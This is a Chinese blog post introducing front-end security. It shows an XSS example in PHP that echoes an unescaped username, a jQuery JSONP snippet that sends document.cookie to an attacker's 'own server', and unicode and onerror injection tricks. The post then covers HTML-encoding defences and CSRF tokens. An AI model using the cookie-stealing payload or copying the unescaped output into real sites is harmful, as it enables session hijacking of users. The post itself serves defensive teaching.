---
title: 前端安全感想
date: 2017-02-06 10:36:02
tags: 前端安全
categories: 前端安全
---
在网上很多人都担心安全问题，我的账号为什么被盗了，我的信息怎么会泄露呢？

下面我们来分类简单让大家了解下：

## XSS攻击

前端主要的代码有三块：HTML, CSS, JavaScript.

而XSS攻击jiu是JavaScript脚本注入，举个例子：
```
<?php
    $username="侯医生";
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <div>
            用户名：<?php echo $username;?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
    </body>
</html>
```
![](https://sfault-image.b0.upaiyun.com/701/600/701600306-57b92c7e724bc "结果图片")

若用户起名的时候故意带上script标签呢，例如：
```
<?php
    $username="<script>alert('侯医生');</script>";
?>
```
![](https://sfault-image.b0.upaiyun.com/231/619/2316196233-57b950abc20ee "结果图片")
没有错，script标签被执行了。别问我这又有什么用呢，呵呵，当script代码替换为：
```
$.ajax({
    url: '自己的服务器',
    dataType: 'jsonp',
    data: {'盗取的用户cookie': document.cookie}
});
```
再在各个QQ群中，散播自己的空间，引诱别人来访问。就可以拿到用户在这个域名下的cookie或者其他隐私了。

## solve:

解决办法当然是有的，最简单的就是将script标签进行转义

将 `<script>` 转义变为 `&lt;script&gt;`

结果如下：

![](https://sfault-image.b0.upaiyun.com/131/927/1319275882-57b95393c137b "结果图片")

我们看下html中的源码：

![](https://sfault-image.b0.upaiyun.com/421/602/4216027545-57b954db80610 "结果图片")

我们将用户传进来的字符串先进行hemlEncode处理
处理函数如下
```
function htmlEncode(s){  
    var div = document.createElement('div');  
    div.appendChild(document.createTextNode(s));  
    return div.innerHTML;  
}  
function htmlDecode(s){  
    var div = document.createElement('div');  
    div.innerHTML = s;  
    return div.innerText || div.textContent;  
}  
```
在JQ中也可以这样写：
```
function htmlEncodeJQ ( str ) {  
    return $('<span/>').text( str ).html();  
}
function htmlDecodeJQ ( str ) {  
    return $('<span/>').html( str ).text();  
}  
```


这是第一层最基础的防范，当然还有利用unicode码伪装的script标签，例如:**"\u003cscript\u003ealert('okok');"**
```
$(#id).append("\u003cscript\u003ealert('okok');");
```
JQ中的append会将其解析出来。

还有利用img中图片加载失败的时候会调用onerror方法进行script注入的和url中的参数

## CSRF攻击

CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。


防御的话，第一是用post请求保护自己的数据，第二是用token来做验证。具体操作的话自行百度。

## 最后的提醒，我们平时开发要注意些什么？
* 开发时要提防用户产生的内容，要对用户输入的信息进行层层检测
* 要注意对用户的输出内容进行过滤(进行转义等)
* 重要的内容记得要加密传输(无论是利用https也好，自己加密也好)
* get请求与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。
* 对于URL上携带的信息，要谨慎使用。
* 心中时刻记着，自己的网站哪里可能有危险。

> 感想发自：[[聊一聊系列]聊一聊WEB前端安全那些事儿](https://segmentfault.com/a/1190000006672214?utm_source=weekly&utm_medium=email&utm_campaign=email_weekly#articleHeader14)


